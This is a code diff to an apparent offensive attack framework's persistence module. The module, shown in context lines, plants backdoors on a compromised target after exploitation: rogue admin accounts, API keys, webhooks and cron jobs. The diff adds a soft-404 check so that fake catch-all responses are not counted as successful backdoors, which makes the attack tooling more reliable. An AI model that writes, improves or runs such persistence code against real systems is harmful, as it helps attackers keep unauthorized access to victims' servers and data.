@@ -9,6 +9,7 @@ import logging
 import json
 from typing import Dict, List, Any, Optional
 from .base import PersistenceModule
+from .soft404 import is_soft404
 import hashlib
 import time
 
@@ -32,10 +33,12 @@ class PersistenceEngine(PersistenceModule):
         )
         self.backdoors: List[Dict[str, Any]] = []
         self.admin_accounts: List[str] = []
+        self._sig = None   # soft-404 baseline signature from recon
 
     async def execute(self, context) -> Dict[str, Any]:
         """Execute persistence attacks using exploit results"""
         logger.info(f"[Persist] Starting persistence operations on {context.target_url}")
+        self._sig = getattr(context, "soft404_signature", None)
 
         # Only attempt if exploit was successful
         if not context.access_granted:
@@ -100,6 +103,11 @@ class PersistenceEngine(PersistenceModule):
                         timeout=aiohttp.ClientTimeout(total=12)
                     ) as resp:
                         if resp.status in [200, 201]:
+                            body = await resp.text(errors="replace")
+                            if is_soft404(resp.status, body,
+                                          resp.headers.get("Content-Type", ""), self._sig):
+                                logger.info(f"    ✗ Catch-all response for {username} — not a real endpoint")
+                                continue
                             logger.info(f"    ✓ Account created: {username}")
                             self.admin_accounts.append(username)
                             self.backdoors.append({
@@ -140,6 +148,11 @@ class PersistenceEngine(PersistenceModule):
                     timeout=aiohttp.ClientTimeout(total=12)
                 ) as resp:
                     if resp.status in [200, 201]:
+                        body = await resp.text(errors="replace")
+                        if is_soft404(resp.status, body,
+                                      resp.headers.get("Content-Type", ""), self._sig):
+                            logger.info("  ✗ Catch-all response — not a real endpoint")
+                            return {"success": False, "method": "api_key"}
                         logger.info(f"  ✓ API key created: {api_key[:20]}...")
                         self.backdoors.append({
                             "type": "api_key",
@@ -187,6 +200,11 @@ class PersistenceEngine(PersistenceModule):
                         timeout=aiohttp.ClientTimeout(total=12)
                     ) as resp:
                         if resp.status in [200, 201]:
+                            body = await resp.text(errors="replace")
+                            if is_soft404(resp.status, body,
+                                          resp.headers.get("Content-Type", ""), self._sig):
+                                logger.info("    ✗ Catch-all response — not a real endpoint")
+                                return {"success": False, "method": "webhook"}
                             logger.info(f"  ✓ Webhook registered for event: {event}")
                             self.backdoors.append({
                                 "type": "webhook",
@@ -224,6 +242,11 @@ class PersistenceEngine(PersistenceModule):
                     timeout=aiohttp.ClientTimeout(total=12)
                 ) as resp:
                     if resp.status in [200, 201]:
+                        body = await resp.text(errors="replace")
+                        if is_soft404(resp.status, body,
+                                      resp.headers.get("Content-Type", ""), self._sig):
+                            logger.info("  ✗ Catch-all response — not a real endpoint")
+                            return {"success": False, "method": "cron"}
                         logger.info(f"  ✓ Cron job scheduled")
                         self.backdoors.append({
                             "type": "cron_job",
